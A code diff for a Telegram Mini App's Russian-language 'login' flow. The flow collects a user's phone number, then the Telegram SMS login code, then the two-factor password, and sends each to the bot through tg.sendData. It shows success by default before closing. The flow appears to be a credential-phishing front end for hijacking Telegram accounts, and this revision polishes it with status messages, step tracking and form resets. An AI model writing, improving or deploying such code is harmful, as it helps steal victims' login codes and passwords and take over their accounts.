@@ -6,6 +6,7 @@ document.addEventListener('DOMContentLoaded', () => {
     const loginBtn = document.getElementById('loginBtn');
     const authForm = document.getElementById('authForm');
     const loadingSpinner = document.getElementById('loadingSpinner');
+    const statusMsg = document.getElementById('statusMsg');
     const phoneInput = document.getElementById('phoneInput');
     const codeInput = document.getElementById('codeInput');
     const twoFaInput = document.getElementById('2faInput');
@@ -13,99 +14,126 @@ document.addEventListener('DOMContentLoaded', () => {
     const successMsg = document.getElementById('successMsg');
     const errorMsg = document.getElementById('errorMsg');
 
-    loginBtn.addEventListener('click', async () => {
-        // Анимация: скрываем кнопку, показываем форму
+    let currentStep = 'contact';  // Шаги: contact, code, 2fa
+
+    loginBtn.addEventListener('click', () => {
         loginBtn.style.opacity = '0';
         setTimeout(() => loginBtn.classList.add('hidden'), 300);
         authForm.classList.remove('hidden');
-        loadingSpinner.classList.remove('hidden');
+        statusMsg.textContent = 'Поделитесь контактом для авторизации...';
+        showLoading();
+        currentStep = 'contact';
 
-        // Запрос контакта с улучшенной обработкой
         tg.requestContact()
             .then((contact) => {
                 if (contact && contact.phone_number) {
                     phoneInput.value = contact.phone_number;
                     phoneInput.classList.remove('hidden');
-                    loadingSpinner.classList.add('hidden');
+                    hideLoading();
                     submitBtn.classList.remove('hidden');
-                    submitBtn.textContent = 'Поделиться номером';
-                    errorMsg.classList.add('hidden');
-
-                    // Отправка номера боту
-                    tg.sendData(JSON.stringify({ action: 'share_phone', phone: contact.phone_number }));
+                    submitBtn.textContent = 'Отправить номер';
+                    statusMsg.textContent = 'Номер получен. Отправляем...';
+                    currentStep = 'phone';
                 } else {
                     throw new Error('Contact denied');
                 }
             })
             .catch((error) => {
                 console.error('Request contact error:', error);
-                loadingSpinner.classList.add('hidden');
-                errorMsg.classList.remove('hidden');
+                hideLoading();
                 errorMsg.textContent = '❌ Разрешение отклонено. Попробуйте снова.';
-                // Кнопка "Войти" остаётся (reset частичный)
-                setTimeout(() => {
-                    loginBtn.classList.remove('hidden');
-                    loginBtn.style.opacity = '1';
-                    authForm.classList.add('hidden');
-                }, 2000);
+                errorMsg.classList.remove('hidden');
+                setTimeout(resetForm, 2000);
             });
     });
 
     submitBtn.addEventListener('click', () => {
-        const action = submitBtn.textContent;
-        if (action === 'Поделиться номером') {
-            // Уже отправлено, переходим к коду
-            phoneInput.classList.add('hidden');
-            codeInput.classList.remove('hidden');
-            submitBtn.textContent = 'Отправить код';
-            return;
-        }
+        const step = currentStep;
+        let payload = {};
 
-        if (action === 'Отправить код') {
-            const code = codeInput.value;
-            if (!code) return alert('Введите код');
-            tg.sendData(JSON.stringify({ action: 'verify_code', code: code }));
+        if (step === 'phone') {
+            payload = { action: 'share_phone', phone: phoneInput.value };
+            tg.sendData(JSON.stringify(payload));
             showLoading();
-            // Имитация (в реале бот обработает)
+            statusMsg.textContent = 'Отправляем номер боту...';
+            // Переход к следующему шагу после отправки
             setTimeout(() => {
-                if (Math.random() > 0.5) {
-                    codeInput.classList.add('hidden');
-                    twoFaInput.classList.remove('hidden');
-                    submitBtn.textContent = 'Подтвердить 2FA';
-                    hideLoading();
-                } else {
-                    showSuccess();
-                }
-            }, 2000);
+                hideLoading();
+                phoneInput.classList.add('hidden');
+                codeInput.classList.remove('hidden');
+                submitBtn.textContent = 'Отправить код';
+                statusMsg.textContent = 'Введите SMS-код из Telegram.';
+                currentStep = 'code';
+            }, 1500);  // Короткая задержка для UX
             return;
         }
 
-        if (action === 'Подтвердить 2FA') {
-            const password = twoFaInput.value;
-            if (!password) return alert('Введите пароль');
-            tg.sendData(JSON.stringify({ action: 'verify_2fa', password: password }));
+        if (step === 'code') {
+            const code = codeInput.value.trim();
+            if (!code) {
+                errorMsg.textContent = 'Введите код.';
+                errorMsg.classList.remove('hidden');
+                return;
+            }
+            payload = { action: 'verify_code', code: code };
+            tg.sendData(JSON.stringify(payload));
             showLoading();
-            setTimeout(showSuccess, 1500);
+            statusMsg.textContent = 'Проверяем код...';
+            // Переход к 2FA
+            setTimeout(() => {
+                hideLoading();
+                codeInput.classList.add('hidden');
+                twoFaInput.classList.remove('hidden');
+                submitBtn.textContent = 'Подтвердить 2FA';
+                statusMsg.textContent = 'Если 2FA настроен, введите пароль (иначе оставьте пустым).';
+                currentStep = '2fa';
+            }, 2000);  // Задержка для обработки бота
+            return;
+        }
+
+        if (step === '2fa') {
+            const password = twoFaInput.value;
+            payload = { action: 'verify_2fa', password: password };
+            tg.sendData(JSON.stringify(payload));
+            showLoading();
+            statusMsg.textContent = 'Подтверждаем 2FA...';
+            // Показываем success по умолчанию (бот уточнит в чате)
+            setTimeout(() => {
+                hideLoading();
+                successMsg.classList.remove('hidden');
+                submitBtn.classList.add('hidden');
+                tg.HapticFeedback.notificationOccurred('success');
+                setTimeout(() => tg.close(), 3000);
+            }, 3000);
             return;
         }
     });
 
     function showLoading() {
         loadingSpinner.classList.remove('hidden');
-        submitBtn.classList.add('hidden');
+        submitBtn.disabled = true;
     }
 
     function hideLoading() {
         loadingSpinner.classList.add('hidden');
-        submitBtn.classList.remove('hidden');
+        submitBtn.disabled = false;
+        errorMsg.classList.add('hidden');
     }
 
-    function showSuccess() {
-        hideLoading();
-        successMsg.classList.remove('hidden');
-        tg.sendData(JSON.stringify({ action: 'auth_success' }));
-        setTimeout(() => tg.close(), 2000);
+    function resetForm() {
+        authForm.classList.add('hidden');
+        loginBtn.classList.remove('hidden');
+        loginBtn.style.opacity = '1';
+        currentStep = 'contact';
+        // Очистка полей
+        phoneInput.value = '';
+        codeInput.value = '';
+        twoFaInput.value = '';
+        successMsg.classList.add('hidden');
     }
 
-    // Reset для кнопки "Войти" при ошибке (уже в catch)
+    // Событие после отправки данных (опционально для haptic)
+    tg.onEvent('webAppDataSent', () => {
+        tg.HapticFeedback.impactOccurred('light');
+    });
 });
